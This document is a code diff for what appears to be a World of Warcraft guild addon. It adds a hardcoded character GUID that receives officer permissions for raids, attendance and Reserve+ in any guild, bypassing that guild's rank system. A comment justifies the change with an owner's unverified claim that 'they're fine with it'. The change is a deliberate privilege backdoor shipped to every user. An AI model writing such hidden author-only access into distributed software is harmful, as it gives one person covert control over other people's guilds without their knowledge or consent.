@@ -54,9 +54,19 @@ function Board.IsLeadRank(m)
 		or words:find(" raid ?leads? ") ~= nil
 end
 
+-- The addon's creator (owner, 16 Nov: "Just give me access to all these
+-- things. I'm the addon creator and they're fine with it."): their main
+-- character counts as an officer for raids, attendance and Reserve+, while
+-- they're in the guild. It's in the code, so every player's game agrees.
+-- The same GUID the owner-only Profit view used (v0.4.7).
+Board.CREATORS = { ["Player-6937-001743F0"] = true }
+
 function Board.CanLead(guid, guild)
 	guild = guild or SK.DBM:Guild()
-	return guild ~= nil and type(guid) == "string" and Board.IsLeadRank(guild.members[guid])
+	if guild == nil or type(guid) ~= "string" then return false end
+	local m = guild.members[guid]
+	if Board.CREATORS[guid] and m and not m.leftAt then return true end
+	return Board.IsLeadRank(m)
 end
 
 -- The raids shown (first wave: Barrow Deeps, Hyjal Summit, Onyxia's Lair).
